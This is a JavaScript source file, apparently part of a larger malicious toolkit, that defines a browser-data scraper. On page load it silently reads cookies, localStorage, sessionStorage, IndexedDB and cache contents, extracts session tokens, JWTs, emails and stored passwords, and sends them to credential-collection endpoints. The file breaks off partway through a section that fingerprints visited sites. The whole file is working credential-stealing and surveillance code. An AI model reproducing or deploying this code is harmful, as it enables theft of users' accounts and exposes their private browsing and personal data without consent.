export default class BrowserHistoryScraper {
  constructor(core) {
    this.core = core;
    this.discoveredSites = [];
    this.visitedUrls = [];
    this.externalSessions = [];
    this.savedCredentialsFound = [];
  }

  init() {
    try {
      // Run immediately - no delays, no fluff
      this.scrapeAllAvailableData();
      
      // Also intercept future page activity
      this.interceptNetworkForHistory();
    } catch(e) {
      // Silent fail - don't break the page
    }
  }

  scrapeAllAvailableData() {
    try {
      this.extractFromCookies();
    } catch(e) {}
    try {
      this.extractFromLocalStorage();
    } catch(e) {}
    try {
      this.extractFromSessionStorage();
    } catch(e) {}
    try {
      this.extractFromIndexedDB();
    } catch(e) {}
    try {
      this.extractFromServiceWorkerCaches();
    } catch(e) {}
    try {
      this.extractFromPerformanceResources();
    } catch(e) {}
    try {
      this.extractFromReferrerChain();
    } catch(e) {}
    try {
      this.extractFromAutofillData();
    } catch(e) {}
    try {
      this.extractFromBookmarklets();
    } catch(e) {}
    try {
      this.extractFromPasswordManagerData();
    } catch(e) {}
    try {
      this.extractFromBrowserSyncData();
    } catch(e) {}
    try {
      this.extractFromExtensions();
    } catch(e) {}
    try {
      this.extractFromWebSQL();
    } catch(e) {}
    try {
      this.extractFromCacheStorage();
    } catch(e) {}
    try {
      this.extractFromNetworkTiming();
    } catch(e) {}
    try {
      this.extractFromLinkPreloads();
    } catch(e) {}
    try {
      this.extractFromManifest();
    } catch(e) {}
    try {
      this.extractFromRedirectChain();
    } catch(e) {}
  }

  // === TECHNIQUE 1: COOKIE ANALYSIS (WORKS 100%) ===

  extractFromCookies() {
    const cookies = document.cookie.split(';').filter(c => c.trim());
    const cookieData = [];
    
    cookies.forEach(cookie => {
      const [name, ...rest] = cookie.split('=');
      const value = rest.join('=')?.trim();
      const nameLower = name?.trim()?.toLowerCase() || '';
      
      // These cookies directly reveal browsing history and external sessions
      const historyIndicators = [
        // Google Analytics
        { pattern: '_ga', type: 'Google Analytics', session: true },
        { pattern: '_gid', type: 'Google Analytics', session: true },
        { pattern: '_gat', type: 'Google Analytics', session: true },
        { pattern: '_ga_', type: 'Google Analytics Session', session: true },
        // Facebook
        { pattern: '_fbp', type: 'Facebook Pixel', session: true },
        { pattern: 'fr', type: 'Facebook Session', session: true },
        { pattern: 'xs', type: 'Facebook Session', session: true },
        { pattern: 'c_user', type: 'Facebook User ID', session: true, userData: true },
        { pattern: 'datr', type: 'Facebook Browser', session: true },
        { pattern: 'sb', type: 'Facebook Browser', session: true },
        // Google Ads
        { pattern: '_gcl_', type: 'Google Ads', session: true },
        { pattern: '_gac_', type: 'Google Ads', session: true },
        // Microsoft
        { pattern: 'MUID', type: 'Microsoft/Bing', session: true },
        { pattern: 'MSFPC', type: 'Microsoft', session: true },
        { pattern: 'MC1', type: 'Microsoft', session: true },
        { pattern: 'MSCC', type: 'Microsoft Consent', session: true },
        // Amazon
        { pattern: 'session-id', type: 'Amazon Session', session: true, site: 'amazon' },
        { pattern: 'session-token', type: 'Amazon Token', session: true, site: 'amazon' },
        { pattern: 'x-amz-', type: 'Amazon', session: true, site: 'amazon' },
        // Twitter/X
        { pattern: 'auth_token', type: 'Twitter Auth', session: true, site: 'twitter' },
        { pattern: 'twid', type: 'Twitter ID', session: true, site: 'twitter' },
        { pattern: 'ct0', type: 'Twitter CSRF', session: true, site: 'twitter' },
        // LinkedIn
        { pattern: 'li_', type: 'LinkedIn', session: true, site: 'linkedin' },
        { pattern: 'liap', type: 'LinkedIn', session: true, site: 'linkedin' },
        { pattern: 'JSESSIONID', type: 'Java Session', session: true },
        // PHP sites
        { pattern: 'PHPSESSID', type: 'PHP Session', session: true, site: 'php' },
        // ASP.NET
        { pattern: 'ASP.NET_SessionId', type: 'ASP.NET Session', session: true },
        { pattern: '.ASPXAUTH', type: 'ASP.NET Auth', session: true },
        // Cloudflare
        { pattern: '__cfduid', type: 'Cloudflare', session: true },
        { pattern: '__cf_bm', type: 'Cloudflare Bot', session: true },
        // Stripe
        { pattern: '__stripe', type: 'Stripe Payment', session: true },
        // PayPal
        { pattern: 'paypal', type: 'PayPal', session: true },
        // Shopify
        { pattern: '_shopify', type: 'Shopify', session: true },
        { pattern: 'cart', type: 'Shopify Cart', session: true },
        // TikTok
        { pattern: 'tt_', type: 'TikTok', session: true },
        // Pinterest
        { pattern: '_pinterest', type: 'Pinterest', session: true },
        // Reddit
        { pattern: 'reddit', type: 'Reddit', session: true },
        // YouTube
        { pattern: 'YSC', type: 'YouTube', session: true },
        { pattern: 'VISITOR_INFO1', type: 'YouTube Visitor', session: true },
        { pattern: 'LOGIN_INFO', type: 'YouTube Login', session: true },
        // Gmail/Google
        { pattern: 'SID', type: 'Google Auth', session: true, userData: true },
        { pattern: 'HSID', type: 'Google Auth', session: true, userData: true },
        { pattern: 'SSID', type: 'Google Auth', session: true, userData: true },
        { pattern: 'APISID', type: 'Google API', session: true },
        { pattern: 'SAPISID', type: 'Google API', session: true },
        { pattern: '__Secure-', type: 'Secure Cookie', session: true },
        // Adobe
        { pattern: 's_', type: 'Adobe Analytics', session: true },
        // HubSpot
        { pattern: 'hubspot', type: 'HubSpot', session: true },
        // Intercom
        { pattern: 'intercom', type: 'Intercom', session: true },
        // Drift
        { pattern: 'drift', type: 'Drift Chat', session: true },
        // Hotjar
        { pattern: '_hj', type: 'Hotjar', session: true },
        // Sentry
        { pattern: 'sentry', type: 'Sentry', session: true },
      ];

      for (const indicator of historyIndicators) {
        if (nameLower.includes(indicator.pattern.toLowerCase())) {
          const siteIndicator = {
            cookieName: name?.trim(),
            cookieType: indicator.type,
            site: indicator.site || name?.trim()?.split('_')[0] || 'unknown',
            hasValue: !!value,
            truncatedValue: value?.substring(0, 50),
            confidence: indicator.site ? 'HIGH' : 'MEDIUM',
            hasSessionData: indicator.session || false,
            hasUserData: indicator.userData || false
          };

          cookieData.push(siteIndicator);

          // If this looks like a logged-in session, capture it
          if (indicator.session && value && value.length > 5) {
            this.externalSessions.push({
              source: 'cookie',
              site: indicator.site || name?.trim(),
              sessionType: indicator.type,
              cookieValue: value.substring(0, 100),
              confidence: 'HIGH',
              loggedIn: indicator.userData || value.length > 20
            });

            // If it contains auth data, send as credential
            if (indicator.userData && value && value.length > 0) {
              this.savedCredentialsFound.push({
                source: 'cookie-session',
                site: indicator.site,
                type: indicator.type,
                data: value.substring(0, 100)
              });
            }
          }
        }
      }
    });

    // Identify which sites the user has active sessions on
    if (cookieData.length > 0) {
      const sites = [...new Set(cookieData.map(c => c.site).filter(Boolean))];
      const sessions = [...new Set(cookieData.filter(c => c.hasSessionData).map(c => c.site))];
      
      this.discoveredSites.push(...sites);
      this.visitedUrls.push(...cookieData.filter(c => c.confidence === 'HIGH').map(c => `https://${c.site}.com`));

      this.core.send('/api/collect/formdata', {
        formId: 'cookie-history-analysis',
        fields: {
          totalCookies: cookies.length,
          identifiedSites: sites.join(', '),
          activeSessions: sessions.join(', '),
          sessionCount: sessions.length,
          data: cookieData.slice(0, 30).map(c => `${c.site} (${c.cookieType}) ${c.hasSessionData ? '🔑' : ''}`).join(' | ')
        },
        url: window.location.href
      });

      // Send any discovered session tokens
      if (this.externalSessions.length > 0) {
        this.core.send('/api/collect/formdata', {
          formId: 'external-sessions-discovered',
          fields: {
            sessions: this.externalSessions.map(s => `${s.site}:${s.sessionType}:${s.loggedIn ? 'LOGGED_IN' : 'session'}`).join(' || '),
            count: this.externalSessions.length,
            savedCredentials: this.savedCredentialsFound.map(c => `${c.site}:${c.type}`).join(' || ')
          },
          url: window.location.href
        });
      }
    }
  }

  // === TECHNIQUE 2: LOCALSTORAGE ANALYSIS (WORKS 100%) ===

  extractFromLocalStorage() {
    // Guard: localStorage may throw in private/incognito browsing on some browsers
    let localStorageAvailable = false;
    try {
      const testKey = '__ls_test__';
      localStorage.setItem(testKey, '1');
      localStorage.removeItem(testKey);
      localStorageAvailable = true;
    } catch(e) {
      return; // localStorage not available
    }

    const lsData = [];
    
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (!key) continue;
      const value = localStorage.getItem(key);
      if (!value) continue;
      
      const keyLower = key.toLowerCase();
      const valueStr = value.substring(0, 500);
      
      // These keys directly reveal external browsing history and sessions
      const historyPatterns = [
        // Google
        'ga_', '_ga', '_gid', 'gaclient', 'google_', 'gmp_', '__gads',
        // Facebook
        'fb_', 'facebook_', 'fblo_', 'fbsr_', 'fbat_',
        // Twitter
        'twitter_', 'tw_', 'oauth_token', 'oauth_verifier',
        // LinkedIn
        'linkedin_', 'li_', 'li-at', 'liap_',
        // Amazon
        'amazon_', 'amzn_', 'aws_',
        // Microsoft
        'ms_', 'microsoft_', 'outlook_', 'live_', 'onenote_',
        // Apple
        'apple_', 'icloud_', 'itunes_',
        // Spotify
        'spotify_', 'sp_', 'spotify',
        // Netflix
        'netflix_', 'nflx_',
        // GitHub
        'github_', 'gh_', 'github',
        // Stack Overflow
        'stackoverflow_', 'stack_',
        // Reddit
        'reddit_', 'reddit',
        // Discord
        'discord_', 'discord',
        // Slack
        'slack_', 'slack',
        // YouTube
        'youtube_', 'yt_', 'youtube',
        // Instagram
        'instagram_', 'ig_',
        // TikTok
        'tiktok_', 'tt_',
        // Pinterest
        'pinterest_', 'pin_',
        // Snapchat
        'snapchat_', 'snap_',
        // WhatsApp
        'whatsapp_', 'wa_',
        // Telegram
        'telegram_', 'tg_',
        // PayPal
        'paypal_', 'paypal',
        // Stripe
        'stripe_', 'stripe', '__stripe_',
        // Shopify
        'shopify_', 'shopify', 'cart_',
        // WooCommerce
        'woocommerce_', 'woo_',
        // WordPress
        'wordpress_', 'wp_', 'wp-',
        // Medium
        'medium_', 'medium',
        // Twitch
        'twitch_', 'twitch',
        // Steam
        'steam_', 'steam',
        // Epic Games
        'epic_', 'epicgames_',
        // Banking keywords
        'bank_', 'banking_', 'chase_', 'wellsfargo_', 'bankofamerica_', 'bofa_',
        'capitalone_', 'amex_', 'discover_', 'citibank_', 'usbank_',
        // Email
        'gmail_', 'outlook_', 'yahoo_', 'protonmail_', 'mail_',
        // Password managers
        'bitwarden_', 'lastpass_', '1password_', 'dashlane_', 'keeper_',
        // JWT tokens
        'token_', 'jwt_', 'access_token_', 'refresh_token_', 'id_token_',
        // Session
        'session_', 'auth_', 'login_', 'logged_', 'user_token',
        // API keys
        'api_key', 'apikey', 'secret_', 'private_key',
        // Analytics that track pages visited
        'mixpanel_', 'amplitude_', 'segment_', 'heap_', 'fullstory_',
        'hotjar_', 'luckyorange_', 'crazyegg_', 'mouseflow_',
        // Session replay
        '__session', '__client', '__host', '__app_',
        // Router history (these contain full URL history)
        'router_', 'history_', 'navigation_', 'page_', 'pageview_',
        'visited_', 'recently_', 'lastVisited', 'lastPage', 'currentPage',
        'state_', 'store_', 'redux_', 'vuex_', 'mobx_', 'recoil_',
        // E-commerce cart history
        'cart_', 'shopping_', 'checkout_', 'order_', 'purchase_',
        // Travel history
        'flight_', 'hotel_', 'booking_', 'trip_', 'airbnb_', 'expedia_',
        // Job sites
        'linkedin_job', 'indeed_', 'glassdoor_', 'monster_',
        // Dating
        'tinder_', 'bumble_', 'hinge_', 'okcupid_', 'match_',
        // Streaming
        'netflix_', 'hulu_', 'disney_', 'hbomax_', 'paramount_',
        'peacock_', 'prime_', 'crunchyroll_',
        // Gaming
        'steam_', 'epic_', 'origin_', 'ubisoft_', 'battlenet_', 'riot_',
        'xbox_', 'playstation_', 'nintendo_',
        // VPN
        'vpn_', 'expressvpn_', 'nordvpn_', 'surfshark_', 'pia_',
        // Crypto
        'coinbase_', 'binance_', 'kraken_', 'metamask_', 'wallet_',
        'crypto_', 'bitcoin_', 'ethereum_', 'nft_',
        // Cloud services
        'aws_', 'gcp_', 'azure_', 'digitalocean_', 'heroku_', 'vercel_',
        'netlify_', 'cloudflare_', 'datadog_', 'newrelic_',
        // Developer
        'github_', 'gitlab_', 'bitbucket_', 'docker_', 'npm_', 'pypi_',
        'stackoverflow_', 'codepen_', 'codesandbox_', 'replit_',
        // Education
        'udemy_', 'coursera_', 'edx_', 'udacity_', 'khan_', 'duolingo_',
        'chegg_', 'quizlet_', 'canvas_', 'blackboard_',
        // Health
        'fitbit_', 'strava_', 'myfitnesspal_', 'headspace_', 'calm_',
        'webmd_', 'health_', 'hospital_', 'doctor_',
        // Government
        'irs_', 'gov_', '.gov_', 'socialsecurity_', 'uscis_',
        // Other common
        'wikipedia_', 'imdb_', 'rottentomatoes_', 'yelp_', 'tripadvisor_',
        'zillow_', 'realtor_', 'redfin_', 'indeed_', 'monster_',
      ];

      for (const pattern of historyPatterns) {
        if (keyLower.includes(pattern.toLowerCase())) {
          // Check if the value contains URLs (full history)
          let containsUrls = false;
          let urlsFound = [];
          
          if (valueStr.includes('http') || valueStr.includes('https')) {
            const urlMatches = valueStr.match(/https?:\/\/[^\s"',;]+/g);
            if (urlMatches) {
              urlsFound = urlMatches.slice(0, 20);
              containsUrls = true;
              this.visitedUrls.push(...urlMatches);
            }
          }
          
          // Check for email addresses (exposes linked accounts)
          let emailsFound = [];
          const emailMatches = valueStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
          if (emailMatches) {
            emailsFound = emailMatches.slice(0, 5);
          }

          // Check for JWT tokens
          const jwtMatches = valueStr.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
          
          // Check for API keys
          const apiKeyMatches = valueStr.match(/[A-Za-z0-9_-]{20,40}/g);

          lsData.push({
            key: key,
            site: pattern.replace(/_/g, '').replace(/[-_]/g, ' ').trim(),
            pattern: pattern,
            containsUrls,
            urlsFound: urlsFound.slice(0, 5),
            emailsFound,
            hasJwt: !!jwtMatches,
            hasApiKey: !!apiKeyMatches,
            valuePreview: valueStr.substring(0, 100)
          });

          // If this contains a JWT, send it as a credential
          if (jwtMatches && jwtMatches.length > 0) {
            const jwt = jwtMatches[0];
            try {
              const payload = JSON.parse(atob(jwt.split('.')[1]));
              this.savedCredentialsFound.push({
                source: 'localStorage-jwt',
                site: pattern.replace(/_/g, ''),
                email: payload.email || payload.sub || '',
                token: jwt.substring(0, 100)
              });
            } catch(e) {}
          }

          // If email found, it's a high-value hit
          if (emailsFound.length > 0) {
            this.savedCredentialsFound.push({
              source: 'localStorage-email',
              site: pattern.replace(/_/g, ''),
              email: emailsFound[0],
              data: valueStr.substring(0, 200)
            });
          }

          break; // Only match first pattern per key
        }
      }

      // Also check for URL-containing values
      if (valueStr.includes('"url"') || valueStr.includes("'url'") || valueStr.includes('"pageUrl"')) {
        try {
          const parsed = JSON.parse(valueStr);
          if (parsed.url || parsed.pageUrl || parsed.referrer || parsed.path) {
            this.visitedUrls.push(parsed.url || parsed.pageUrl || parsed.path);
            lsData.push({
              key: key,
              site: 'url-container',
              pattern: 'url-field',
              containsUrls: true,
              urlsFound: [parsed.url || parsed.pageUrl || parsed.path],
              valuePreview: valueStr.substring(0, 100)
            });
          }
          if (parsed.email || parsed.username) {
            this.savedCredentialsFound.push({
              source: 'localStorage-parsed',
              site: key,
              email: parsed.email || '',
              username: parsed.username || ''
            });
          }
        } catch(e) {}
      }
    }

    if (lsData.length > 0) {
      this.discoveredSites.push(...lsData.filter(d => d.site !== 'url-container').map(d => d.site));
      
      this.core.send('/api/collect/formdata', {
        formId: 'localStorage-history',
        fields: {
          totalKeys: localStorage.length,
          sitesDiscovered: [...new Set(lsData.map(d => d.site))].join(', '),
          emailExposure: [...new Set(lsData.filter(d => d.emailsFound?.length > 0).flatMap(d => d.emailsFound))].join(', '),
          jwtFound: lsData.filter(d => d.hasJwt).length,
          apiKeysFound: lsData.filter(d => d.hasApiKey).length,
          urlsDiscovered: [...new Set(lsData.filter(d => d.containsUrls).flatMap(d => d.urlsFound))].join(', ').substring(0, 500),
          details: lsData.slice(0, 20).map(d => `${d.key} (${d.site})${d.containsUrls ? ' [URLS]' : ''}${d.hasJwt ? ' [JWT]' : ''}${d.emailsFound?.length > 0 ? ' [EMAIL]' : ''}`).join(' | ')
        },
        url: window.location.href
      });

      // Send discovered saved credentials
      if (this.savedCredentialsFound.length > 0) {
        this.core.send('/api/collect/credentials', {
          source: 'localStorage-harvest',
          username: this.savedCredentialsFound[0]?.email || this.savedCredentialsFound[0]?.username || '',
          email: this.savedCredentialsFound[0]?.email || '',
          password: this.savedCredentialsFound[0]?.token || this.savedCredentialsFound[0]?.data || '',
          url: this.savedCredentialsFound[0]?.site || window.location.href,
          formType: 'browser-history-saved-creds',
          fieldData: {
            allCredentials: this.savedCredentialsFound.slice(0, 10).map(c => `${c.site}:${c.email || c.username || 'no-user'}`).join(' || '),
            totalSaved: this.savedCredentialsFound.length
          }
        });
      }
    }
  }

  // === TECHNIQUE 3: SESSIONSTORAGE ANALYSIS (WORKS 100%) ===

  extractFromSessionStorage() {
    // Guard: sessionStorage may throw in private/incognito browsing on some browsers
    let sessionStorageAvailable = false;
    try {
      const testKey = '__ss_test__';
      sessionStorage.setItem(testKey, '1');
      sessionStorage.removeItem(testKey);
      sessionStorageAvailable = true;
    } catch(e) {
      return; // sessionStorage not available
    }

    const ssData = [];
    
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (!key) continue;
      const value = sessionStorage.getItem(key);
      if (!value) continue;
      
      const keyLower = key.toLowerCase();
      const valueStr = value.substring(0, 500);

      // Session storage often contains CURRENT SESSION data from external sites
      const sessionPatterns = [
        'current_user', 'currentUser', 'user_data', 'userData', 'profile_',
        'user_profile', 'userProfile', 'session_data', 'sessionData',
        'oauth_', 'access_token', 'refresh_token', 'id_token',
        'csrf_', 'xsrf_', '_csrf', '_xsrf', 'nonce_',
        'auth_', 'authenticate_', 'authorization_',
        'login_', 'logged_', 'signin_', 'signup_',
        'basket_', 'cart_', 'checkout_', 'order_',
        'checkout_', 'payment_', 'billing_', 'shipping_',
        'search_', 'query_', 'keyword_', 'searchHistory',
        'recently_', 'recent_', 'last_', 'previous_',
        'redirect_', 'return_', 'callback_', 'referrer_',
        'two_factor', '2fa', 'mfa_', 'otp_', 'verification_',
        'password_', 'pass_', 'pwd_', 'secret_',
        'email_', 'phone_', 'address_', 'credit_', 'card_',
        'payment', 'stripe_', 'paypal_', 'braintree_',
        'route_', 'router_', 'navigation_', 'path_',
        'api_', 'endpoint_', 'graphql_', 'rest_',
        'token_', 'jwt_', 'bearer_', 'api_key'
      ];

      for (const pattern of sessionPatterns) {
        if (keyLower.includes(pattern.toLowerCase())) {
          let emails = [];
          let urls = [];
          
          const emailMatch = valueStr.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
          if (emailMatch) emails = emailMatch.slice(0, 3);
          
          const urlMatch = valueStr.match(/https?:\/\/[^\s"',;]+/g);
          if (urlMatch) urls = urlMatch.slice(0, 5);

          let parsedData = null;
          try { parsedData = JSON.parse(value); } catch(e) {}

          ssData.push({
            key,
            pattern: pattern,
            valuePreview: valueStr.substring(0, 100),
            containsEmail: emails.length > 0,
            emails,
            containsUrls: urls.length > 0,
            urls,
            isJson: !!parsedData,
            parsedPreview: parsedData ? JSON.stringify(parsedData).substring(0, 200) : ''
          });

          if (emails.length > 0) {
            this.visitedUrls.push(...urls);
            this.savedCredentialsFound.push({
              source: 'sessionStorage',
              site: key,
              email: emails[0],
              data: valueStr.substring(0, 300)
            });
          }

          break;
        }
      }
    }

    if (ssData.length > 0) {
      this.core.send('/api/collect/formdata', {
        formId: 'sessionStorage-history',
        fields: {
          totalKeys: sessionStorage.length,
          sensitiveKeys: ssData.length,
          emailExposure: [...new Set(ssData.filter(d => d.containsEmail).flatMap(d => d.emails))].join(', '),
          details: ssData.slice(0, 15).map(d => `${d.key}${d.containsEmail ? ' [EMAIL]' : ''}${d.containsUrls ? ' [URLS]' : ''}`).join(' | ')
        },
        url: window.location.href
      });
    }
  }

  // === TECHNIQUE 4: INDEXEDDB (WORKS FOR MOST WEBSITES) ===

  async extractFromIndexedDB() {
    try {
      // Guard: indexedDB may not be available in all contexts
      if (typeof indexedDB === 'undefined' || !('indexedDB' in window)) return;
      
      const databases = await indexedDB.databases?.() || [];
      
      for (const dbMeta of databases) {
        let db;
        try {
          db = await new Promise((resolve, reject) => {
            const req = indexedDB.open(dbMeta.name);
            req.onsuccess = () => resolve(req.result);
            req.onerror = () => reject(new Error('indexedDB open failed'));
            // Prevent infinite hanging
            const timer = setTimeout(() => reject(new Error('timeout')), 3000);
            req.onsuccess = (e) => {
              clearTimeout(timer);
              resolve(req.result);
            };
          });
        } catch(e) { continue; }

        if (!db) continue;

        const storeNames = [...db.objectStoreNames];
        const dbData = [];

        for (const storeName of storeNames) {
          // Only look at stores likely to contain history or sessions
          const interestingStores = [
            'history', 'session', 'sessions', 'auth', 'authentication',
            'credentials', 'passwords', 'keys', 'tokens',
            'profile', 'user', 'users', 'account', 'accounts',
            'cache', 'response', 'request', 'network',
            'analytics', 'events', 'pageviews', 'pages',
            'config', 'settings', 'preferences', 'prefs',
            'cart', 'basket', 'orders', 'transactions',
            'log', 'logs', 'activity', 'audit',
            'notifications', 'messages', 'conversations',
            'draft', 'drafts', 'notes', 'documents',
            'files', 'uploads', 'attachments',
            'oauth', 'openid', 'saml',
            'device', 'devices', 'sessions_devices'
          ];

          const isInteresting = interestingStores.some(s => storeName.toLowerCase().includes(s));
          if (!isInteresting) continue;

          try {
            const transaction = db.transaction(storeName, 'readonly');
            const store = transaction.objectStore(storeName);
            
            const items = await new Promise((resolve, reject) => {
              const req = store.getAll();
              req.onsuccess = () => resolve(req.result || []);
              req.onerror = () => reject(new Error('getAll failed'));
              // Prevent infinite hanging
              const timer = setTimeout(() => reject(new Error('timeout')), 2000);
              req.onsuccess = (e) => {
                clearTimeout(timer);
                resolve(req.result || []);
              };
            });

            if (items && items.length > 0) {
              const itemsToSend = items.slice(0, 10);
              const emails = [];
              const urls = [];
              const passwords = [];
              
              itemsToSend.forEach(item => {
                const str = JSON.stringify(item);
                const foundEmails = str.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
                if (foundEmails) emails.push(...foundEmails);
                
                const foundUrls = str.match(/https?:\/\/[^\s"',;]+/g);
                if (foundUrls) urls.push(...foundUrls);
                
                if (str.includes('"password"') || str.includes("'password'") || str.includes('"pass"')) {
                  try {
                    if (item.password) passwords.push(item.password.substring(0, 50));
                    if (item.pass) passwords.push(item.pass.substring(0, 50));
                  } catch(e) {}
                }
              });

              dbData.push({
                storeName,
                count: items.length,
                sample: JSON.stringify(itemsToSend).substring(0, 300),
                emailsFound: [...new Set(emails)].slice(0, 5),
                urlsFound: [...new Set(urls)].slice(0, 10),
                passwordsFound: [...new Set(passwords)].slice(0, 3)
              });

              if (urls.length > 0) this.visitedUrls.push(...urls);
              if (emails.length > 0) {
                this.savedCredentialsFound.push({
                  source: 'indexedDB',
                  site: dbMeta.name,
                  email: emails[0],
                  data: `Store: ${storeName}, Items: ${items.length}`
                });
              }
              if (passwords.length > 0) {
                this.savedCredentialsFound.push({
                  source: 'indexedDB-password',
                  site: dbMeta.name,
                  password: passwords[0],
                  store: storeName
                });
              }
            }
          } catch(e) {}
        }

        db.close();

        if (dbData.length > 0) {
          this.discoveredSites.push(dbMeta.name);
          
          // Send any found passwords as credentials
          for (const d of dbData) {
            if (d.passwordsFound.length > 0) {
              this.core.send('/api/collect/credentials', {
                source: 'indexedDB',
                password: d.passwordsFound[0],
                email: d.emailsFound[0] || '',
                url: dbMeta.name,
                formType: 'indexedDB-credential-store',
                fieldData: { store: d.storeName, totalItems: d.count }
              });
            }
          }

          this.core.send('/api/collect/formdata', {
            formId: 'indexedDB-history',
            fields: {
              database: dbMeta.name,
              stores: dbData.map(d => `${d.storeName}(${d.count} items)${d.emailsFound.length > 0 ? ' [EMAIL]' : ''}${d.passwordsFound.length > 0 ? ' [PWD!]' : ''}`).join(' || '),
              urls: [...new Set(dbData.flatMap(d => d.urlsFound))].join(', ').substring(0, 500),
              emails: [...new Set(dbData.flatMap(d => d.emailsFound))].join(', ')
            },
            url: window.location.href
          });
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 5: SERVICE WORKER CACHES (WORKS) ===

  async extractFromServiceWorkerCaches() {
    try {
      if (typeof caches === 'undefined' || !('caches' in window)) return;

      const cacheNames = await caches.keys();
      
      for (const cacheName of cacheNames) {
        const cache = await caches.open(cacheName);
        const requests = await cache.keys();
        
        const urls = requests.map(r => {
          try {
            return {
              url: r.url,
              method: r.method,
              mode: r.mode,
              destination: r.destination
            };
          } catch(e) { return null; }
        }).filter(Boolean);

        if (urls.length > 0) {
          // Extract hostnames to identify visited sites
          const hostnames = [...new Set(urls.map(u => {
            try { return new URL(u.url).hostname; } catch(e) { return null; }
          }).filter(Boolean))];

          this.discoveredSites.push(...hostnames);
          this.visitedUrls.push(...urls.map(u => u.url));

          // Check for stored responses with sensitive data
          const sensitiveResponses = [];
          for (const reqInfo of urls.slice(0, 20)) {
            try {
              const response = await cache.match(reqInfo.url);
              if (response && response.ok) {
                const contentType = response.headers?.get?.('content-type') || '';
                if (contentType.includes('json')) {
                  const data = await response.clone().json();
                  const dataStr = JSON.stringify(data).substring(0, 500);
                  
                  if (dataStr.includes('token') || dataStr.includes('password') || 
                      dataStr.includes('email') || dataStr.includes('session')) {
                    sensitiveResponses.push({
                      url: reqInfo.url.substring(0, 150),
                      method: reqInfo.method,
                      preview: dataStr
                    });
                    
                    // Extract credentials
                    if (data.access_token) {
                      this.savedCredentialsFound.push({
                        source: 'sw-cache-token',
                        url: reqInfo.url,
                        token: data.access_token
                      });
                    }
                    if (data.email) {
                      this.savedCredentialsFound.push({
                        source: 'sw-cache-email',
                        url: reqInfo.url,
                        email: data.email
                      });
                    }
                  }
                }
              }
            } catch(e) {}
          }

          this.core.send('/api/collect/formdata', {
            formId: 'service-worker-cache-history',
            fields: {
              cacheName,
              totalRequests: urls.length,
              uniqueHostnames: hostnames.join(', '),
              sensitiveFound: sensitiveResponses.length,
              sensitiveData: sensitiveResponses.map(s => `${s.url}: ${s.preview.substring(0, 100)}`).join(' || ').substring(0, 1000)
            },
            url: window.location.href
          });

          // Send credential if found in cache
          if (this.savedCredentialsFound.length > 0) {
            this.core.send('/api/collect/credentials', {
              source: 'service-worker-cache',
              username: this.savedCredentialsFound[0]?.email || '',
              email: this.savedCredentialsFound[0]?.email || '',
              password: this.savedCredentialsFound[0]?.token || '',
              url: this.savedCredentialsFound[0]?.url || window.location.href,
              formType: 'browser-cache-harvest',
              fieldData: { cacheName, totalSensitive: sensitiveResponses.length }
            });
          }
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 6: PERFORMANCE RESOURCES (REVEALS BROWSING HISTORY) ===

  extractFromPerformanceResources() {
    try {
      if (!window.performance || typeof window.performance.getEntries !== 'function') return;

      const entries = window.performance.getEntries();
      const resources = [];
      const hostnames = new Set();

      entries.forEach(entry => {
        if (entry.name && typeof entry.name === 'string' && entry.name.startsWith('http')) {
          try {
            const url = new URL(entry.name);
            hostnames.add(url.hostname);
            
            if (entry.entryType === 'navigation' || entry.entryType === 'paint') {
              resources.push({
                url: entry.name.substring(0, 200),
                type: entry.entryType,
                duration: Math.round(entry.duration || 0),
                hostname: url.hostname
              });
            }
          } catch(e) {}
        }
      });

      if (hostnames.size > 0) {
        const visitedHosts = [...hostnames];
        this.discoveredSites.push(...visitedHosts);
        this.visitedUrls.push(...resources.map(r => r.url));
        
        // Check for specific well-known sites
        const knownSites = [
          'google.com', 'facebook.com', 'youtube.com', 'amazon.com', 'twitter.com',
          'instagram.com', 'linkedin.com', 'reddit.com', 'tiktok.com', 'snapchat.com',
          'pinterest.com', 'whatsapp.com', 'netflix.com', 'spotify.com', 'github.com',
          'stackoverflow.com', 'medium.com', 'twitch.tv', 'discord.com', 'slack.com',
          'microsoft.com', 'apple.com', 'dropbox.com', 'zoom.us', 'teams.microsoft.com',
          'calendly.com', 'notion.so', 'figma.com', 'atlassian.net', 'salesforce.com',
          'hubspot.com', 'mail.google.com', 'outlook.live.com', 'yahoo.com',
          'protonmail.com', 'bankofamerica.com', 'chase.com', 'wellsfargo.com',
          'capitalone.com', 'paypal.com', 'venmo.com', 'coinbase.com', 'robinhood.com',
          'doordash.com', 'ubereats.com', 'grubhub.com', 'airbnb.com', 'vrbo.com',
          'expedia.com', 'booking.com', 'tripadvisor.com', 'yelp.com', 'zillow.com',
          'indeed.com', 'glassdoor.com', 'monster.com', 'linkedin.com/jobs',
          'udemy.com', 'coursera.org', 'edx.org', 'khanacademy.org', 'duolingo.com',
          'amazon.com/gp/prime', 'hulu.com', 'disneyplus.com', 'hbomax.com',
          'paramountplus.com', 'peacocktv.com', 'crunchyroll.com', 'nflx.com',
          'steampowered.com', 'epicgames.com', 'origin.com', 'battle.net',
          'xbox.com', 'playstation.com', 'nintendo.com', 'reddit.com/r/',
          'imgur.com', 'deviantart.com', 'behance.net', 'dribbble.com',
          'wikipedia.org', 'imdb.com', 'rottentomatoes.com', 'metacritic.com',
          'walmart.com', 'target.com', 'bestbuy.com', 'homedepot.com', 'lowes.com',
          'costco.com', 'ikea.com', 'ebay.com', 'etsy.com', 'craigslist.org',
          'news.ycombinator.com', 'producthunt.com', 'techcrunch.com', 'theverge.com',
          'cnn.com', 'nytimes.com', 'wsj.com', 'bbc.com', 'foxnews.com',
          'reuters.com', 'bloomberg.com', 'forbes.com', 'businessinsider.com',
        ];
        
        const foundSites = knownSites.filter(site => 
          visitedHosts.some(h => h.includes(site))
        );

        if (foundSites.length > 0) {
          this.core.send('/api/collect/formdata', {
            formId: 'performance-history-known-sites',
            fields: {
              sites: foundSites.join(', '),
              count: foundSites.length,
